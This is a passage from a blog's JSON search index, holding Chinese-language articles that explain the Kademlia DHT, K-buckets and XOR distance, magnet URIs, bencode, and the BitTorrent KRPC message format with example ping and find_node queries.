如果该位是1，进入左子树，是0则进入右子树（这只是人为约定，反过来处理也可以）\n\t\t4. 全部数位都处理完后，这个 key 就对应了二叉树上的某个【叶子】\n\n+ 距离算法——异或（XOR）\n\n\t接下来要聊的是 Kad 最精妙之处——采用 XOR（按比特异或操作）算法计算 key 之间的“距离”。这种搞法使得它具备了类似于“几何距离”的某些特性（下面用 ⊕ 表示 XOR）\n\t\n\t```\n\t(A ⊕ B) == (B ⊕ A)\tXOR 符合“交换律”，具备对称性。相比之下，Chord 的距离算法不对称\n\t(A ⊕ A) == 0\t反身性，自身距离为零\n\t(A ⊕ B) > 0\t【不同】的两个 key 之间的距离必大于零\n\t(A ⊕ B) + (B ⊕ C) >= (A ⊕ C)\t三角不等式\n\t```\n\t\n+ 路由机制\n\n\t+ 二叉树的拆分\n\n\t对每一个节点，都可以【按照自己的视角】对整个二叉树进行拆分。\n\t\n\t拆分的规则是：先从根节点开始，把【不包含】自己的那个子树拆分出来；然后在剩下的子树再拆分不包含自己的下一层子树；以此类推，直到最后只剩下自己。\n\t\n\tKad 默认的散列值空间是 m=160（散列值有 160 比特），因此拆分出来的子树【最多】有 160 个（考虑到实际的节点数【远远小于】2160，子树的个数会明显小于 160）。\n\t\n\t对于每一个节点而言，当它以自己的视角完成子树拆分后，会得到 n 个子树；对于每个子树，如果它都能知道里面的一个节点，那么它就可以利用这 n 个节点进行递归路由，从而到达整个二叉树的【任何一个】节点\n\t\n+ K-桶（K-bucket） \n\n\t每个节点在完成子树拆分后，只需要知道每个子树里面的一个节点，就足以实现全遍历。但是考虑到健壮性（请始终牢记：分布式系统的节点是动态变化滴），光知道【一个】显然是不够滴，需要知道【多个】才比较保险。\n\t\n\t所以 Kad 论文中给出了一个“K-桶（K-bucket）”的概念。也就是说：每个节点在完成子树拆分后，要记录每个子树里面的 K 个节点。这里所说的 K 值是一个【系统级】的常量。由使用 Kad 的软件系统自己设定（比如 BT 下载使用的 Kad 网络，K 设定为 8）。\n\t\n\tK 桶其实就是【路由表】。对于某个节点而言，如果【以它自己为视角】拆分了 n 个子树，那么它就需要维护 n 个路由表，并且每个路由表的【上限】是 K。说 K 只是一个【上限】，是因为有两种情况使得 K 桶的尺寸会小于 K。\n\t1. 距离越近的子树就越小。如果整个子树【可能存在的】节点数小于 K，那么该子树的 K 桶尺寸永远也不可能达到 K。\n\t2. 有些子树虽然实际上线的节点数超过 K，但是因为种种原因，没有收集到该子树足够多的节点，这也会使得该子树的 K 桶尺寸小于 K。\n\t\n+ K-桶（K-bucket）的刷新机制\n\n\t+ `主动收集节点`　\t\t　\n\t\t\n\t\t任何节点都可以主动发起“查询节点”的请求（对应于协议类型 FIND_NODE），从而刷新 K 桶中的节点信息\n\t\t\n\t+ `被动收集节点`\n\n\t\t如果收到其它节点发来的请求（协议类型 FIND_NODE 或 FIND_VALUE），会把对方的 ID 加入自己的某个 K 桶中。 \n\t\t\n\t+ `探测失效节点`\n\t\n\t\tKad 还是支持一种探测机制（协议类型 PING），可以判断某个 ID 的节点是否在线。因此就可以定期探测路由表中的每一个节点，然后把下线的节点从路由表中干掉。\n\n\n+ “并发请求”与“α 参数”\n\n\t“K桶”的这个设计思路【天生支持并发】。因为【同一个】“K桶”中的每个节点都是平等的，没有哪个更特殊；而且对【同一个】“K桶”中的节点发起请求，互相之间没有影响（无耦合）。\n\t\n\t所以 Kad 协议还引入了一个“α 参数”，默认设置为 3，使用 Kad 的软件可以在具体使用场景中调整这个 α 因子。\n\t\n\t当需要路由到某个“子树”，会从该子树对应的“K桶”中挑选【α 个节点】，然后对这几个节点【同时】发出请求。这么做有啥好处捏？俺在本文末尾聊“性能”和“安全性”时会具体介绍。\n\t\n+ 节点的加入\n\t\n\t- 任何一个新来的节点（假设叫 A），需要先跟 DHT 中已有的任一节点（假设叫 B）建立连接。\n\t- A 随机生成一个散列值作为自己的 ID（对于足够大的散列值空间，ID 相同的概率忽略不计）\n\t- A 向 B 发起一个查询请求（协议类型 FIND_NODE），请求的 ID 是自己（通俗地说，就是查询自己）\n\t- B 收到该请求之后，（如前面所说）会先把 A 的 ID 加入自己的某个 K 桶中。然后，根据 FIND_NODE 协议的约定，B 会找到【K个】最接近 A 的节点，并返回给 A。（B 怎么知道哪些节点接近 A 捏？这时候，【用 XOR 表示距离】的算法就发挥作用啦）\n\t- A 收到这 K 个节点的 ID 之后，（仅仅根据这批 ID 的值）就可以开始初始化自己的 K 桶。\n\t- 然后 A 会继续向刚刚拿到的这批节点发送查询请求（协议类型 FIND_NODE），如此往复（递归），直至 A 建立了足够详细的路由表。\n\n+ 节点的退出\n\t\n\t与 Chord 不同，Kad 对于节点退出没有额外的要求（没有“主动退出”的说法）。\n　　所以，Kad 的节点想离开 DHT 网络不需要任何操作（套用徐志摩的名言：悄悄的我走了，正如我悄悄的来）\n\n\n\n### 5. 参考资料\n\n+ https://colobu.com/2018/03/26/distributed-hash-table/\n+ https://program-think.blogspot.com/2017/09/Introduction-DHT-Kademlia-Chord.html\n\n","tags":["dht"],"categories":["BitTorrent"]},{"title":"Kademlia_DHT_KRPC_BitTorrent协议","url":"%2Fp%2F1ea24e2a.html","content":"\n# 0.引言\n\n平常我们高端用户都会用到BT工具来分享一些好玩的资源，例如ubuntu 13.04的ISO安装盘，一些好听的音乐等。这个时候我们会进入一个叫做P2P的网络，大家都在这个网络里互相传递数据，这种分布式的数据传输解决了HTTP、FTP等单一服务器的带宽压力。以往的BT工具（包括现在也有）在加入这个P2P网络的时候都需要借助一个叫Tracker的中心服务器，这个服务器是用来登记有哪些用户在请求哪些资源，然后让请求同一个资源的用户都集中在一起互相分享数据，形成的一个集群叫做Swarm。\n\n这种工作方式有一个弊端就是一旦Tracker服务器出现故障或者线路遭到屏蔽，BT工具就无法正常工作了。所以聪明的人类后来发明了一种叫做DHT（Distributed Hash Table）的去中心化网络。每个加入这个DHT网络的人都要负责存储这个网络里的资源信息和其他成员的联系信息，相当于所有人一起构成了一个庞大的分布式存储数据库。在DHT里定位一个用户和定位一个资源的方法是一样的，他们都使用SHA－1产生的哈希值来作标识。\n\n\n### 0x1: Kademlia/DHT/KRPC/BitTorrent之间的关系\n\nKademlia是一个最初提出的框架和理论基础，P2P对等资源共享的思想从这里开始衍生，DHT和KRPC是在Kademlia的基础上进行了包装和发展，BitTorrent是在这三者之上的文件共享分发协议。\n\n<!-- more -->\n\n### 0x2: Magnet URI格式\n\n```\nmagnet:?xt=urn:btih:<info-hash>&dn=<name>&tr=<tracker-url>\n\n1. <info-hash>: Infohash的16进制编码，共40字符。为了与其它的编码兼容，客户端应当也支持32字符的infohash base32编码 \n2. Xt是唯一强制的参数\n3. dn是在等待metadata时可能供客户端显示的名字\n4. 如果只有一个字段，Tr是tracker的url，如果有很多的tracker，那么多个tr字段会被包含进去 \n# dn和tr都是可选的 \n```\n如果没有指定tracker，客户端应使用DHT来获取peers\n\n\n### 0x3:P2P的含义\n\n从第一个P2P应用系统Napster的出现开始，P2P技术掀起的风暴为互联网带来了一场空前的变革。P2P不是一个全新的概念，P2P理念的起源可以追溯到20世纪80年代。目前，在学术界、工业界对于P2P没有一个统一的定义。Peer在英语里有“(地位、能力等)同等者”、“同事”和“伙伴”等意义，这样一来，P2P也就可以理解为“伙伴对伙伴”的意思，或称为对等网 \n\n严格地定义纯粹的P2P网络，它是指完全分布的系统，每一个节点都是在功能上和任务上完全相同的。但是这样的定义就会排除掉一些使用“超级节点”的系统或者一些使用中央服务器做一些非核心任务的系统。广义的定义里面指出P2P是一种能善于利用互联网上的存储、CPU周期、内容和用户活动等各种资源的一类应用程序[3]，包括了一些依赖中央服务器才能工作的系统 \n\nP2P这个定义并不是从系统的结构或者内部的操作特征出发考虑的，而是从人们外在的感知角度出发，如果一个系统从直观上看是各个计算机之间直接互相联系的就可以被叫做P2P。当前，技术上比较权威的定义为，P2P系统是一个由直接相连的节点们所构成的分布式的系统[4]，这些节点能够为了共享内容、CPU 时间、存储或者带宽等资源而自我形成一定的网络拓扑结构，能够在适应节点数目的变化和失效的同时维持可以接受的链接能力和性能，并且不需要一个全局服务器或者权威的中介的支持。本文从人们感知的角度出发，采用P2P的广义定义\n\n\n# 1. Kademlia协议\n\n### 0x1: Kademlia\n\nKademlia是一种通过分散式杂凑表实现的协议算法，它是由Petar和David为非集中式P2P计算机网络而设计的\n\n```\n1. Kademlia规定了网络的结构，也规定了通过节点查询进行信息交换的方式\n2. Kademlia网络节点之间使用UDP进行通讯\n3. 参与通讯的所有节点形成一张虚拟网(或者叫做覆盖网)。这些节点通过一组数字(或称为节点ID)来进行身份标识\n4. 节点ID不仅可以用来做身份标识，还可以用来进行值定位(值通常是文件的散列或者关键词)\n5. <font color=red>其实，节点ID与文件散列直接对应，它所表示的那个节点存储着哪儿能够获取文件和资源的相关信息</font>\n6. 当我们在网络中搜索某些值(即通常搜索存储文件散列或关键词的节点)的时候，Kademlia算法需要知道与这些值相关的键，然后分步在网络中开始搜索。每一步都会找到一些节点，这些节点的ID与键更为接近，如果有节点直接返回搜索的值或者再也无法找到与键更为接近的节点ID的时候搜索便会停止。这种搜索值的方法是非常高效的\n7. 与其他的分散式杂凑表的实现类似，在一个包含n个节点的系统的值的搜索中，Kademlia仅访问O(log(n))个节点。非集中式网络结构还有更大的优势，那就是它能够显著增强抵御拒绝服务攻击的能力。即使网络中的一整批节点遭受泛洪攻击，也不会对网络的可用性造成很大的影响，通过绕过这些漏洞(被攻击的节点)来重新编织一张网络，网络的可用性就可以得到恢复 \n```\n\n### 0x2: p2p网络架构演进\n\n```\n1. 第一代P2P文件分享网络，像Napster，依赖于中央数据库来协调网络中的查询\n2. 第二代P2P网络，像Gnutella，使用泛滥式查询(query flooding)来查询文件，它会搜索网络中的所有节点\n3. 第三代p2p网络使用分散式杂凑表来查询网络中的文件，分散式杂凑表在整个网络中储存资源的位置\n```\n\n这些协议追求的主要目标就是快速定位期望的节点。Kademlia基于两个节点之间的距离计算，该距离是\"两个网络节点ID号的异或\"，计算的结果最终作为整型数值返回。关键字和节点ID有同样的格式和长度，因此，可以使用同样的方法计算关键字和节点ID之间的距离。节点ID一般是一个大的随机数，选择该数的时候所追求的一个目标就是它的唯一性(希望在整个网络中该节点ID是唯一的)。异或距离跟实际上的地理位置没有任何关系，只与ID相关。因此很可能来自德国和澳大利亚的节点由于选择了相似的随机ID而成为邻居。选择异或是因为通过它计算的距离享有几何距离公式的一些特征，尤其体现在以下几点\n\n```\n1. 节点和它本身之间的异或距离是0\n2. 异或距离是对称的：即从A到B的异或距离与从B到A的异或距离是等同的\n3. 异或距离符合三角不等式: 三个顶点A B C，AC异或距离小于或等于AB异或距离和BC异或距离之和，这种几何数学特征，可以很好的支撑算法进行寻路路由\n```\n\n由于以上的这些属性，在实际的节点距离的度量过程中计算量将大大降低。Kademlia搜索的每一次迭代将距目标至少更近1 bit(每次根据XOR结果，往前选择1bit更近的节点)。一个基本的具有2的n次方个节点的Kademlia网络在最坏的情况下只需花n步就可找到被搜索的节点或值\n\n\n>因为Kademlia是根据bit位XOR计算得到\"相对距离\"的，对于越低bit位，XOR可能得到的结果越小，对于越高位的bit位，XOR可能得到的值就越大，并且是呈现2的指数方式增长的，所以，从数学上来说，一个DHT网络中的所有节点，通过这种方式(XOR距离)进行寻址，每次前进一个bit，最大只需要log2N次即可到达目标节点(log2逼近的思路，即bit 2可以表示世界上任何数字)\n\n### 0x3: 路由表(就是K桶,存放端口)\n\nKademlia路由表由多个列表组成，<font color=red>每个列表对应节点ID的一位(例如: 假如节点ID共有6位，则节点的路由表将包含6个列表)，</font><font color=green>一个列表中包含多个条目，条目中包含定位其他节点所必要的一些数据。列表条目中的这些数据通常是由其他节点的IP地址，端口和节点ID组成。</font>这里仔细思考一下\n\n\n1. 节点ID的一位就是1bit，假设我们的节点ID是: 111000\n2. 对第一个K桶来说，它的列表中的条目必须第一bit不能是1，因为第一个K桶的含义是和该节点的距离是最远的一个分组，第一位不为1，它背后的含义是该分组里的节点和该节点的距离至少在2^6以上，它代表了整个网络中和该节点逻辑距离最远的一些节点 它的列表条目是这样的: 0 00000 ~ 0 111111\n3. 对第二个K桶来说，它的列表中的条目的第一位必须是1，表示和当前节点的第一bit相同，第二bit不能是1，这样代表的意思是第二个K桶里的节点和该节点的距离是介于MAX(2bit)和MIN(1bit)之间的距离，它的列表条目是这样的: 10 0000 ~ 10 1111\n4. 第三个K桶的情况和前2个相同  \n5. 对第四个K桶的来说，它的列表中的条目前三位都是1，第四位不是0，它的列表条目是这样的: 1111 00 ~ 1111 11\n6. 后面的bit位情况类推，可以看出，<font color=red>越低bit位的K桶的MAX(XOR)就越小，它的可变范围就越小了。这代表了越低bit位的K桶里存储的都是距离当前节点越近的Nod节点</font>\n\n\n而条目列表以节点ID的一位(即1bit)来分组是有道理的：我们使用log2N的指数分级方法把除当前节点的全网所有节点都进行了分组，当别的节点来向当前节点请求某个资源HASH的时候，将待搜索寻址的\"目标节点ID\"和路由表进行异或，会有2种情况\n\n1. 找到某个条目和目标节点XOR为0，即已经寻址成功，则直接返回这个条目给requester即可\n2. <font color=red>如果没找到XOR结果为0的条目，则选取那个XOR值最小的条目对应的K桶中的K个条目返回给requester，因为这些条目是最有可能存储了目标节点ID条目的</font>\n\n\n每个列表对应于与节点相距\"特定范围距离\"的一些节点，节点的第n个列表中所找到的节点的第n位与该节点的第n位肯定不同，而前n-1位相同\n\n```\n1. 这就意味着很容易使用网络中远离该节点的一半节点来填充第一个列表(第一位不同的节点最多有一半)\n2. 而用网络中四分之一的节点来填充第二个列表(比第一个列表中的那些节点离该节点更近一位)\n3. 依次类推。如果ID有128个二进制位，则网络中的每个节点按照不同的异或距离把其他所有的节点分成了128类，ID的每一位对应于其中的一类\n```\n\n随着网络中的节点被某节点发现，它们被逐步加入到该节点的相应的列表中，这个过程中包括\n\n1. <font color=red>向节点列表中存信息: 录入别的节点发布的声明</font>\n2. 从节点列表中取信息的操作\n3. 甚至还包括当时协助其他节点寻找相应键对应值的操作: 转发其他节点的寻址请求\n\n\n这个过程中发现的所有节点都将被加入到节点的列表之中，因此节点对整个网络的感知是动态的，这使得网络一直保持着频繁地更新，增强了抵御错误和攻击的能力\n\n---\n\n在Kademlia相关的论文中，列表也称为K桶，其中K是一个系统变量，如20，每一个K桶是一个最多包含K个条目的列表，也就是说，网络中所有节点的一个列表(对应于某一位，与该节点相距一个特定的距离)最多包含20个节点。随着对应的bit位变低(即对应的异或距离越来越短)(bit位越小，可能的距离MAX值就越小了，即距离目标节点的距离越近)，K桶包含的可能节点数迅速下降(K定义的是该bit对应的列表最多能存储K个条目，但不一定都是K存满，当到最低几个bit位的时候，K桶里可能就只有几个个位数的条目了)。由于网络中节点的实际数量远远小于可能ID号的数量，所以对应那些短距离的某些K桶可能一直是空的(如果异或距离只有1，可能的数量就最大只能为1，这个异或距离为1的节点如果没有发现，则对应于异或距离为1的K桶则是空的)\n\n\n![1](Kademlia_DHT_KRPC_BitTorrent协议/1.png)\n\n从这个逻辑图中可以看出\n\n```\n1. 节点的HASH值决定了它们的逻辑距离，即Kademlia网络中的下一跳寻址是根据HASH XOR的值范围(数值大小范围)结果决定的\n2. 该网络最大可有2^3，即8个关键字和节点，目前共有7个节点加入，每个节点用一个小圈表示(在树的底部)\n3. 考虑那个用黑圈标注的节点6，它共有3个K桶(即3bit位)\n\n节点0，1和2(二进制表示为000，001和010)是第一个K桶的候选节点\n000 -> 110: 6\n001 -> 110: 5\n010 -> 110: 4\n\n节点3目前(二进制表示为011)还没有加入网络\n\n节点4和节点5(二进制表示分别为100和101)是第二个K桶的候选节点\n100 -> 110: 2\n101 -> 110: 1 \n\n节点7(二进制表示为111)是第3个K桶的候选节点\n111 -> 110: 1\n```\n\n图中3个K桶都用灰色圈表示，假如K桶的大小(即K值)是2，那么第一个K桶只能包含3个节点中的2个。众所周知，那些长时间在线连接的节点未来长时间在线的可能性更大，基于这种静态统计分布的规律，Kademlia选择把那些长时间在线的节点存入K桶，这一方法增长了未来某一时刻有效节点的数量(hot hint)，同时也提供了更为稳定的网络。当某个K桶已满，而又发现了相应于该桶的新节点的时候，那么，就首先检查K桶中最早访问的节点，假如该节点仍然存活，那么新节点就被安排到一个附属列表中(作为一个替代缓存). 只有当K桶中的某个节点停止响应的时候，替代cache才被使用。换句话说，新发现的节点只有在老的节点消失(失效)后才被使用\n\n\n### 0x4: 协议消息\n\nKademlia协议共有四种消息\n\n```\n1. PING消息: 用来测试节点是否仍然在线\n2. STORE消息: 在某个节点中存储一个键值对\n3. FIND_NODE消息: 消息请求的接收者将返回自己桶中离请求键值最近的K个节点: 将请求者请求的节点HASH和自己的HASH进行XOR计算，将计算结果\n4. FIND_VALUE消息: 与FIND_NODE一样，不过当请求的接收者存有请求者所请求的键的时候，它将返回相应键的值\n```\n\n每一个RPC消息中都包含一个发起者加入的随机值，这一点确保响应消息在收到的时候能够与前面发送的请求消息匹配\n\n\n### 0x5: 定位节点\n\n节点查询可以异步进行，也可以同时进行，同时查询的数量由α表示，一般是3\n\n\n1. 在节点查询的时候，它先得到它K桶中离所查询的键值最近的K个节点(XOR值最小的那个条目所在的分组)，然后向这K个节点发起FIND_NODE消息请求(因为这个K桶内的节点最有可能寻址成功)\n2. 消息接收者收到这些请求消息后将在他们的K桶中进行查询，如果他们知道离被查键更近的节点，他们就返回这些节点(最多K个)\n    + 找到某个条目和目标节点XOR为0，即已经寻址成功，则直接返回这个条目给requester即可\n    + 如果没找到XOR结果为0的条目，则选取那个XOR值最小的条目对应的K桶中的K个条目返回给requester，因为这些条目是最有可能存储了目标节点ID条目的\n3. <font color=\"red\">消息的请求者在收到响应后将使用它所收到的响应结果来更新它的结果列表，返回的结果也应该插入到刚才发起请求的那个K桶里，这个结果列表总是保持K个响应FIND_NODE消息请求的最优节点(即离被搜索键更近的K个节点)</font>\n4. 然后消息发起者将向这K个最优节点发起查询，因为刚开始的查询很可能K桶里存的不全是目标节点，而是潜在地离目标节点较近的节点\n5. 不断地迭代执行上述查询过程。因为每一个节点比其他节点对它周边的节点有更好的感知能力(水波扩散式的节点寻址方式)，因此响应结果将是一次一次离被搜索键值越来越近的某节点。如果本次响应结果中的节点没有比前次响应结果中的节点离被搜索键值更近了(即发现这轮查询的结果未发生diff变化了)，这个查询迭代也就终止了\n6. 当这个迭代终止的时候，响应结果集中的K个最优节点就是整个网络中离被搜索键值最近的K个节点(从以上过程看，这显然是局部的，而非整个网络，因为这本质和最优解搜索算法一样，可能陷入局部最优解而无法获得全局最优解) \n7. 节点信息中可以增加一个往返时间，或者叫做RTT的参数，这个参数可以被用来定义一个针对每个被查询节点的超时设置，即当向某个节点发起的查询超时的时候，另一个查询才会发起，当然，针对某个节点的查询在同一时刻从来不超过α个\n\n\n### 0x6: 定位和冗余拷贝资源\n\n通过把资源信息与键进行映射，资源即可进行定位，杂凑表是典型的用来映射的手段。由于以前的STORE消息，存储节点将会有对应STORE所存储的相关资源的信息。定位资源时，如果一个节点存有相应的资源的值的时候，它就返回该资源，搜索便结束了，除了该点以外，定位资源与定位离键最近的节点的过程相似\n\n\n1. 考虑到节点未必都在线的情况，资源的值被存在多个节点上(节点中的K个)，并且，为了提供冗余，还有可能在更多的节点上储存值\n2. 储存值的节点将定期搜索网络中与储存值所对应的键接近的K个节点并且把值复制到这些节点上，这些节点可作为那些下线的节点的补充\n3. 另外，对于那些普遍流行的内容，可能有更多的请求需求，通过让那些访问值的节点把值存储在附近的一些节点上(不在K个最近节点的范围之类)来减少存储值的那些节点的负载，这种新的存储技术就是缓存技术，通过这种技术，依赖于请求的数量，资源的值被存储在离键越来越远的那些节点上(资源热度越高，缓存cache就越广泛)，这使得那些流行的搜索可以更快地找到资源的储存者\n5. 由于返回值的节点的NODE_ID远离值所对应的关键字，网络中的\"热点\"区域存在的可能性也降低了。依据与键的距离，缓存的那些节点在一段时间以后将会删除所存储的缓存值。DHT的某些实现(如Kad)即不提供冗余(复制)节点也不提供缓存，这主要是为了能够快速减少系统中的陈旧信息。在这种网络中，提供文件的那些节点将会周期性地更新网络上的信息(通过NODE_LOOKUP消息和STORE消息)。当存有某个文件的所有节点都下线了，关于该文件的相关的值(源和关键字)的更新也就停止了，该文件的相关信息也就从网络上完全消失了 \n\n\n### 0x7: 加入网络\n\n1. 想要加入网络的节点首先要经历一个引导过程。在引导过程中，节点需要知道其他已加入该网络的某个节点的IP地址和端口号(可从用户或者存储的列表中获得)。假如正在引导的那个节点还未加入网络，它会计算一个目前为止还未分配给其他节点的随机ID号，直到离开网络，该节点会一直使用该ID号 \n2. 正在加入Kademlia网络的节点在它的某个K桶中插入引导节点(加入该网络的介绍人)(负责加入节点的初始化工作)，然后向它的唯一邻居(引导节点)发起NODE_LOOKUP操作请求来定位自己，这种\"自我定位\"将使得Kademlia的其他节点(收到请求的节点)能够使用新加入节点的Node Id填充他们的K桶(邻居互相认识)\n3. 同时也能够使用那些查询过程的中间节点(位于新加入节点和引导节点的查询路径上的其他节点)来填充新加入节点的K桶(相当于完成一个DNS递归查询后，沿途路径上的DNS IP都被记录了)。想象一下这个过程\n    + 新加入的节点可能和\"引导节点\"距离很远，它一上来就向离自己几何距离最远的引导节点问话: \"谁知道我自己这个节点在哪?\"，引导节点会尽力去回答这个问题，即引导节点会把自己K桶内最有可能知道该节点位置(即离该几点XOR几何距离最近的K个点返回给新加入的请求节点)\n    + <font color=\"red\">新加入的请求方收到了K个节点后，把这K个节点保存进自己的K桶，然后继续向这些节点去\"询问(发起find_node请求)\"自己的节点在哪，这些节点会收到这些请求，同时也把新加入节点保存进自己的K桶内</font>\n    + 整个过程和向DNS根域名服务器请求解析某个域名的递归过程类似\n4. 这一自查询过程使得新加入节点自引导节点所在的那个K桶开始，由远及近，对沿途的所有节点逐步得到刷新，整条链路上的邻居都认识了这个新邻居\n5. 最初的时候，节点仅有一个K桶(覆盖所有的ID范围)，当有新节点需要插入该K桶时，如果K桶已满，K桶就开始分裂，分裂发生在节点的K桶的覆盖范围(表现为二叉树某部分从左至右的所有值)包含了该节点本身的ID的时候。对于节点内距离节点最近的那个K桶，Kademlia可以放松限制(即可以到达K时不发生分裂)，因为桶内的所有节点离该节点距离最近，这些节点个数很可能超过K个，而且节点希望知道所有的这些最近的节点。因此，在路由树中，该节点附近很可能出现高度不平衡的二叉子树。假如K是20，新加入网络的节点ID为\"xxx000011001\"，则前缀为\"xxx0011...\"的节点可能有21个，甚至更多，新的节点可能包含多个含有21个以上节点的K桶(位于节点附近的k桶)。这点保证使得该节点能够感知网络中附近区域的所有节点\n\n\n### 0x8: 查询加速\n\n\n1. Kademlia使用异或来定义距离。两个节点ID的异或(或者节点ID和关键字的异或)的结果就是两者之间的距离。对于每一个二进制位来说，如果相同，异或返回0，否则，异或返回1。异或距离满足三角形不等式: 任何一边的距离小于(或等于)其它两边距离之和\n2. 异或距离使得Kademlia的路由表可以建在单个bit之上，即可使用位组(多个位联合)来构建路由表。位组可以用来表示相应的K桶，它有个专业术语叫做前缀，对一个m位的前缀来说，可对应2^m-1个K桶(m位的前缀本来可以对应2^m个K桶)另外的那个K桶可以进一步扩展为包含该节点本身ID的路由树\n3. 一个b位的前缀可以把查询的最大次数从logn减少到logn/b。这只是查询次数的最大值，因为自己K桶可能比前缀有更多的位与目标键相同，这会增加在自己K桶中找到节点的机会，假设前缀有m位，很可能查询一个节点就能匹配2m甚至更多的位组，所以其实平均的查询次数要少的多 \n4. 节点可以在他们的路由表中使用混合前缀，就像eMule中的Kad网络。如果以增加查询的复杂性为代价，Kademlia网络在路由表的具体实现上甚至可以是有异构的\n\n\n### 0x9: 在文件分享网络中的应用\n\nKademlia可在文件分享网络中使用，通过制作Kademlia关键字搜索，我们能够在文件分享网络中找到我们需要的文件以供我们下载。由于没有中央服务器存储文件的索引，这部分工作就被平均地分配到所有的客户端中去\n\n\n\n1. 假如一个节点希望分享某个文件，它先根据文件的内容来处理该文件，通过运算，把文件的内容散列成一组数字，该数字在文件分享网络中可被用来标识文件\n2. <font color=\"red\">这组散列数字必须和节点ID有同样的长度，然后，该节点便在网络中搜索ID值与文件的散列值相近的节点，然后向这些被搜索到的节点广播自己(即把它自己的IP地址存储在那些搜索到的节点上)，本质意思是说: \"你如果要搜索这个文件，就去找那些节点ID就好了，那些节点ID会告诉搜索者应该到自己这里来(文件发布者)来建立TCP连接，下载文件\"，</font><font color=\"blue\">也就是说，它把自己作为文件的源进行了发布(文件共享方式)。正在进行文件搜索的客户端将使用Kademlia协议来寻找网络上ID值与希望寻找的文件的散列值最近的那个节点(寻找文件的过程和寻找节点的机制形成了统一，因为文件和节点的ID的HASH格式是一样的)，然后取得存储在那个节点上的文件源列表</font> \n3. 由于一个键(HASH)可以对应很多值，即同一个文件(通过一个对应的HASH公布到P2P网络中)可以有多个源(因为可能有多个节点都会有这个文件的拷贝)，每一个存储源列表的节点可能有不同的文件的源的信息，这样的话，源列表可以从与键值相近的K个节点获得。 文件的散列值通常可以从其他的一些特别的Internet链接的地方获得，或者被包含在从其他某处获得的索引文件中(即种子文件)\n4. 文件名的搜索可以使用关键词来实现，文件名可以分割成连续的几个关键词，这些关键词都可以散列并且可以和相应的文件名和文件散列储存在网络中。搜索者可以使用其中的某个关键词，联系ID值与关键词散列最近的那个节点，取得包含该关键词的文件列表。由于在文件列表中的文件都有相关的散列值，通过该散列值就可利用上述通常取文件的方法获得要搜索的文件\n\n\n# 2. KRPC 协议 KRPC Protocol\n\nKRPC是BitTorrent在Kademlia理论基础之上定义的一个通信消息格式协议，主要用来支持peer节点的获取(get_peer)和peer节点的声明(announce_peer)，以及判活心跳(ping)、节点寻址(find_node)，它在find_node的原理上和DHT是一样的，同时增加了get_peer/announce_peer/ping协议的支持\n\nKRPC协议是由B编码组成的一个简单的RPC结构，有4种请求：ping、find_node、get_peers 和 announce_peer\n\n\n### 0x0: bencode编码\n\nbencode 有 4 种数据类型: string, integer, list 和 dictionary\n\n```\n1. string: 字符是以这种方式编码的: <字符串长度>:<字符串> \n如 hell: 4:hell\n\n2. integer: 整数是一这种方式编码的: i<整数>e \n如 1999: i1999e\n\n3. list: 列表是一这种方式编码的: l[数据1][数据2][数据3][…]e \n如列表 [hello, world, 101]：l5:hello5:worldi101ee\n\n4. dictionary: 字典是一这种方式编码的: d[key1][value1][key2][value2][…]e，其中 key 必须是 string 而且按照字母顺序排序 \n如字典 {aa:100, bb:bb, cc:200}： d2:aai100e2:bb2:bb2:cci200ee\n```\n\nKRPC 协议是由 bencode 编码组成的一个简单的 RPC 结构，他使用 UDP 报文发送。一个独立的请求包被发出去然后一个独立的包被回复。这个协议没有重发(UDP是无连接协议)\n\n\n### 0x1: KRPC字典基本组成元素\n\n一条 KRPC 消息即可能是request，也可能是response，由一个独立的字典组成\n\n```\n1. t关键字: 每条消息都包含 t 关键字，它是一个代表了 transaction ID 的字符串。transaction ID 由请求节点产生，并且回复中要包含回显该字段(挑战-响应模型)，所以回复可能对应一个节点的多个请求。transaction ID 应当被编码为一个短的二进制字符串，比如 2 个字节，这样就可以对应 2^16 个请求\n2. y关键字: 它由一个字节组成，表明这个消息的类型。y 对应的值有三种情况\n    1) q 表示请求(请求Queries): q类型的消息它包含 2 个附加的关键字 q 和 a\n        1.1) 关键字 q: 是字符串类型，包含了请求的方法名字(get_peers/announce_peer/ping/find_node)\n        1.2) 关键字 a: 一个字典类型包含了请求所附加的参数(info_hash/id..)\n    2) r 表示回复(回复 Responses): 包含了返回的值。发送回复消息是在正确解析了请求消息的基础上完成的，包含了一个附加的关键字 r。关键字 r 是字典类型\n        2.1) id: peer节点id号或者下一跳DHT节点\n                2.2) nodes\": \"\" \n                2.3) token: token\n    3) e 表示错误(错误 Errors): 包含一个附加的关键字 e，关键字 e 是列表类型\n        3.1) 第一个元素是数字类型，表明了错误码，当一个请求不能解析或出错时，错误包将被发送。下表描述了可能出现的错误码\n        201: 一般错误\n        202: 服务错误\n        203: 协议错误，比如不规范的包，无效的参数，或者错误的 toke\n        204: 未知方法 \n        3.2) 第二个元素是字符串类型，表明了错误信息\n```\n\n以上是整个KRPC的协议框架结构，具体到请求Query/回复Response/错误Error还有具体的协议实现\n\n\n### 0x2: 请求Query具体协议\n\n所有的请求都包含一个关键字 id，它包含了请求节点的节点 ID。所有的回复也包含关键字id，它包含了回复节点的节点 ID\n\n\n+ <font color=\"red\"> ping: 检测节点是否可达，请求包含一个参数id，代表该节点的nodeID。对应的回复也应该包含回复者的nodeID </font>\n\n```\nping Query = {\"t\":\"aa\", \"y\":\"q\", \"q\":\"ping\", \"a\":{\"id\":\"abcdefghij0123456789\"}}\nbencoded = d1:ad2:id20:abcdefghij0123456789e1:q4:ping1:t2:aa1:y1:qe\n\t\nResponse = {\"t\":\"aa\", \"y\":\"r\", \"r\": {\"id\":\"mnopqrstuvwxyz123456\"}}\nbencoded = d1:rd2:id20:mnopqrstuvwxyz123456e1:t2:aa1:y1:re\n```\n\n+ <font color=\"red\"> find_node: find_node 被用来查找给定 ID 的DHT节点的联系信息，该请求包含两个参数id(代表该节点的nodeID)和target。回复中应该包含被请求节点的路由表中距离target最接近的K个nodeID以及对应的nodeINFO</font>\n\t\n```\nfind_node Query = {\"t\":\"aa\", \"y\":\"q\", \"q\":\"find_node\", \"a\": {\"id\":\"abcdefghij0123456789\", \"target\":\"mnopqrstuvwxyz123456\"}}\n# \"id\" containing the node ID of the querying node, and \"target\" containing the ID of the node sought by the queryer. \nbencoded = d1:ad2:id20:abcdefghij01234567896:target20:mnopqrstuvwxyz123456e1:q9:find_node1:t2:aa1:y1:qe\n\t\nResponse = {\"t\":\"aa\", \"y\":\"r\", \"r\": {\"id\":\"0123456789abcdefghij\", \"nodes\": \"def456...\"}}\nbencoded = 